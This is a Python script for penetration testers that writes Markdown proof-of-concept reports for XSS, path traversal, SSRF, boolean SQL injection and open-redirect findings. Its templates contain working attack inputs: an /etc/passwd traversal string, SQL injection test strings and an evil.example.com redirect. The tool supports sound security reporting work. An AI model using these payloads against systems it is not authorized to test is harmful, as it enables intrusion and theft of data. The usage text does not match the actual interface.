#!/usr/bin/env python3
"""pocgen — generate reviewable proof-of-concept evidence templates.

usage:  pocgen.py reflex xss -u http://host/search -p q       PoC under Outputs/
        pocgen.py payload                       list available templates
        pocgen.py template=<xss>               quick browse
"""
import argparse
import os
import re
import sys
import time
import urllib.parse

try:
    from _core import c, ok, err, hr, data, PROJECT_ROOT
except ImportError:
    from tools._core import c, ok, err, hr, data, PROJECT_ROOT

TEMPLATES = {
    "xss": {
        "title": "Reflected Cross-Site Scripting",
        "fields": ["url", "param", "payload"],
        "skel": """# XSS — Proof of Concept (reviewable, inert)
**Target:** {url}
**Parameter:** {param}
**Payload:** `{payload}`

## Request
    GET {path}?{param}={enc} HTTP/1.1
    Host: {host}
    Connection: close

## Why
The server echoes the parameter value without encoding. A browser renders
`{payload}` as script. This PoC uses an inert marker (`alert(1)` replaced
below) — replace the marker for a live validation only with written consent.

## Impact
Session theft, keylogging, CSRF-token read, page defacement.

## Remediation
Context-aware output encoding; CSP with `script-src 'nonce-...'`.
""",
    },
    "lfi": {
        "title": "Local File Inclusion / Path Traversal",
        "fields": ["url", "param"],
        "skel": """# LFI — Proof of Concept
**Target:** {url}  **Parameter:** {param}

    {url}?{param}=../../../../etc/passwd

Confirm marker `root:x:0:0:` in the response. (PoC stops at reading a
publicly-readable file; no further data extracted.)
""",
    },
    "ssrf": {
        "title": "Server-Side Request Forgery",
        "fields": ["url", "param", "oob"],
        "skel": """# SSRF — Proof of Concept
**Target:** {url}  **Parameter:** {param}

    {url}?{param}=http://{oob}/

Watch the OOB listener for a hit from the server IP — that is the SSRF
confirmation (blind). Use `--oob` in VAJRA or tools/listener record mode.
""",
    },
    "sqli": {
        "title": "SQL Injection (Boolean-based)",
        "fields": ["url", "param"],
        "skel": """# Blind SQLi — Proof of Concept
**Target:** {url}  **Parameter:** {param}

    True:  {url}?{param}=1' AND '1'='1
    False: {url}?{param}=1' AND '1'='2

A persistent length/delta difference between the two proves a boolean oracle.
""",
    },
    "redirect": {
        "title": "Open Redirect",
        "fields": ["url", "param"],
        "skel": """# Open Redirect — Proof of Concept
**Target:** {url}  **Parameter:** {param}

    {url}?{param}=//evil.example.com/oops

If the Location header is attacker-controlled, the redirect is open.
""",
    },
}


def resolve(url, base=PROJECT_ROOT / "Outputs"):
    os.makedirs(base, exist_ok=True)
    fn = "poc_%s_%d.md" % (time.strftime("%Y%m%d_%H%M%S"), os.getpid())
    return os.path.join(str(base), fn)


def build(tpl, values):
    skel = tpl["skel"]
    out = skel
    if "url" in tpl["fields"]:
        u = values.get("url", "")
        parts = urllib.parse.urlsplit(u)
        path = parts.path or "/"
        qs = dict(urllib.parse.parse_qsl(parts.query))
        qs.update({values.get("param", "q"): values.get("payload", "x")})
        enc = urllib.parse.quote(values.get("payload", with2 := ""))
        out = skel.replace("{url}", u).replace("{param}",
                                               values.get("param", "q"))
        out = out.replace("{host}", parts.netloc).replace("{path}", path)
        out = out.replace("{enc}", urllib.parse.quote(values.get("payload",
                                                            "marker")))
        out = out.replace("{oob}", values.get("oob", "127.0.0.1"))
        out = out.replace("{payload}", values.get("payload", "marker"))
    for k, v in values.items():
        out = out.replace("{%s}" % k, str(v))
    return out


def main():
    ap = argparse.ArgumentParser(prog="pocgen")
    ap.add_argument("template", help="xss|lfi|ssrf|sqli|redirect")
    ap.add_argument("-u", "--url")
    ap.add_argument("-p", "--param")
    ap.add_argument("-P", "--payload")
    ap.add_argument("-o", "--oob", help="oob listener host")
    ap.add_argument("-d", "--dir", help="output dir (default Outputs/)")
    args = ap.parse_args()
    tpl = TEMPLATES.get(args.template.lower())
    if not tpl:
        err("unknown template %r — have: %s" % (
            args.template, ", ".join(sorted(TEMPLATES))))
        return 1
    values = {f: getattr(args, {"url": "url", "param": "param",
                                "payload": "payload", "oob": "oob"}.get(f,
                                                                        None))
              for f in tpl["fields"]}
    need = [f for f in tpl["fields"] if not values.get(f)]
    if need:
        err("missing required fields for %s: %s" % (tpl["title"],
                                                    ", ".join(need)))
        return 1
    base = os.path.join(str(PROJECT_ROOT), args.dir) if args.dir else \
        None
    out = resolve(args.url) if base is None else os.path.join(base,
        "poc_%s.md" % time.strftime("%Y%m%d_%H%M%S"))
    os.makedirs(os.path.dirname(out), exist_ok=True)
    text = build(tpl, values)
    with open(out, "w", encoding="utf-8") as f:
        f.write(text + "\n")
    ok("PoC written -> %s" % out)
    hr()
    print(text) if not args.payload else print(text[:200])
    return 0


if __name__ == "__main__":
    sys.exit(main())